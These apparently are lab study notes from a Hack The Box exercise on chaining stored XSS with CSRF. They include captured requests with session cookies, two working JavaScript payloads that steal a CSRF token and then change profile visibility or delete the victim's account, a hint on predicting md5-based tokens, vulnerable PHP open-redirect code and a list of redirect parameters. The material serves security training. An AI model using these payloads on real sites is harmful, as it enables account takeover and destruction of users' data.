# XSS & CSRF Chaining
## Post Request

```http
POST /app/change-visibility HTTP/1.1
Host: minilab.htb.net
Content-Length: 51
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://minilab.htb.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://minilab.htb.net/app/change-visibility
Accept-Encoding: gzip, deflate, br
Cookie: auth-session=s%3ABMtl5rwSPR7Cqm9QO-z_6qIg9AV5aeA8.gJ8aXg134FcGO1qW3rkaTI2mQ%2B3gRqYaECUX%2BDCFKDM
Connection: keep-alive

csrf=4c8ac90e46b255bdcf30086fa229dbf3&action=change
```

Let us focus on the payload we should specify in the _Country_ field of Ela Stienen's profile to successfully execute a CSRF attack that will change the victim's visibility settings.

## JS Payload

```javascript
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/app/change-visibility',true);
req.send();
function handleResponse(d) {
    var token = this.responseText.match(/name="csrf" type="hidden" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/app/change-visibility', true);
    changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    changeReq.send('csrf='+token+'&action=change');
};
</script>
```

```javascript
req.onload = handleResponse;
```
In the script snippet above, we see the _onload_ event handler, which will perform an action once the page has been loaded. This action will be related to the _handleResponse_ function that we will define later.

```javascript
var token = this.responseText.match(/name="csrf" type="hidden" value="(\w+)"/)[1];
```
The script snippet above defines a variable called _token_, which gets the value of _responseText_ from the page we specified earlier in our request. `/name="csrf" type="hidden" value="(\w+)"/)[1];` looks for a hidden input field called _csrf_ and \w+ matches one or more alphanumeric characters.

![[Pasted image 20250825144453.png]]

## POST Request For Delete
```http
POST /app/delete HTTP/1.1
Host: minilab.htb.net
Content-Length: 45
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://minilab.htb.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://minilab.htb.net/app/delete/ela.stienen@example.com
Accept-Encoding: gzip, deflate, br
Cookie: auth-session=s%3ABMtl5rwSPR7Cqm9QO-z_6qIg9AV5aeA8.gJ8aXg134FcGO1qW3rkaTI2mQ%2B3gRqYaECUX%2BDCFKDM
Connection: keep-alive

csrf=792c757b8ca28ee9a27ed3b6cba8fe3215de40e1
```

## JS Payload for delete

```js
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/app/delete',true);
req.send();
function handleResponse(d) {
    var token = this.responseText.match(/name="csrf" type="hidden" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/app/delete', true);
    changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    changeReq.send('csrf='+token);
};
</script>
```

# Exploiting Weak CSRF Tokens

```shell
akhmadkun@htb[/htb]$ echo -n goldenpeacock467 | md5sum
0bef12f8998057a7656043b6d30c90a2  -
```

When assessing how robust a CSRF token generation mechanism is, make sure you spend a small amount of time trying to come up with the CSRF token generation mechanism. It can be as easy as `md5(username)`, `sha1(username)`, `md5(current date + username)` etc.

# Open Redirect

As you can imagine, this is possible when the legitimate application's redirection functionality does not perform any kind of validation regarding the websites to which the redirection points

```php
$red = $_GET['url'];
header("Location: " . $red);
```

Make sure you check for the following URL parameters when bug hunting, you'll often see them in login pages. Example: ==`/login.php?redirect=dashboard`==

- ?url=
- ?link=
- ?redirect=
- ?redirecturl=
- ?redirect_uri=
- ?return=
- ?return_to=
- ?returnurl=
- ?go=
- ?goto=
- ?exit=
- ?exitpage=
- ?fromurl=
- ?fromuri=
- ?redirect_to=
- ?next=
- ?newurl=
- ?redir=

